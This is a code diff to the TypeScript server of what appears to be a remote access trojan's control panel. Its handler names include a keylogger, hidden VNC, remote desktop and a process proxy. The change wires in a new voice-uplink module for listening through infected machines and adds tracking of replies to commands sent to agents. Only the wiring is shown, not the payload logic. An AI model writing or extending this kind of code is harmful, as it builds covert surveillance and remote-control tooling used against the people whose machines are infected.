@@ -97,6 +97,12 @@ import {
   handleProxyViewerMessage,
   handleProxyViewerOpen,
 } from "./server/ws-file-process-proxy-keylogger";
+import {
+  cleanupVoiceViewer,
+  handleVoiceUplink,
+  handleVoiceViewerMessage,
+  handleVoiceViewerOpen,
+} from "./server/ws-voice";
 import { createNotificationPluginHandlers } from "./server/ws-notifications-plugin";
 import * as clientManager from "./clientManager";
 import * as sessionManager from "./sessions/sessionManager";
@@ -226,6 +232,13 @@ type PendingScript = {
 };
 const pendingScripts = new Map<string, PendingScript>();
 
+type PendingCommandReply = {
+  resolve: (result: { ok: boolean; message?: string }) => void;
+  reject: (error: Error) => void;
+  timeout: NodeJS.Timeout;
+};
+const pendingCommandReplies = new Map<string, PendingCommandReply>();
+
 async function startServer() {
   await loadPluginState();
   let tls:
@@ -314,6 +327,7 @@ async function startServer() {
     client: {
       CORS_HEADERS,
       pendingScripts,
+      pendingCommandReplies,
     },
     wsUpgrade: {
       isAuthorizedAgentRequest: isAuthorizedAgent,
@@ -324,6 +338,7 @@ async function startServer() {
     maxClientPayloadBytes: MAX_WS_MESSAGE_BYTES_CLIENT,
     maxViewerPayloadBytes: MAX_WS_MESSAGE_BYTES_VIEWER,
     pendingScripts,
+    pendingCommandReplies,
     rdStreamingState,
     hvncStreamingState,
     getNotificationConfig,
@@ -334,6 +349,7 @@ async function startServer() {
     handleProcessViewerOpen,
     handleKeyloggerViewerOpen,
     handleProxyViewerOpen,
+    handleVoiceViewerOpen,
     handleNotificationViewerOpen: notificationPluginHandlers.handleNotificationViewerOpen,
     handleConsoleViewerMessage,
     handleRemoteDesktopViewerMessage,
@@ -342,6 +358,7 @@ async function startServer() {
     handleProcessViewerMessage,
     handleKeyloggerViewerMessage,
     handleProxyViewerMessage,
+    handleVoiceViewerMessage,
     dispatchAutoScriptsForConnection,
     takePendingNotificationScreenshot: takePendingNotificationScreenshotForClient,
     storeNotificationScreenshot: storeNotificationScreenshotForPending,
@@ -360,6 +377,8 @@ async function startServer() {
     handleNotificationScreenshotFailure: notificationPluginHandlers.handleNotificationScreenshotFailure,
     handlePluginEvent: notificationPluginHandlers.handlePluginEvent,
     handleNotification: notificationPluginHandlers.handleNotification,
+    handleVoiceUplink,
+    cleanupVoiceViewer,
     stopConsoleOnTarget,
     sendDesktopCommand,
     sendHVNCCommand,
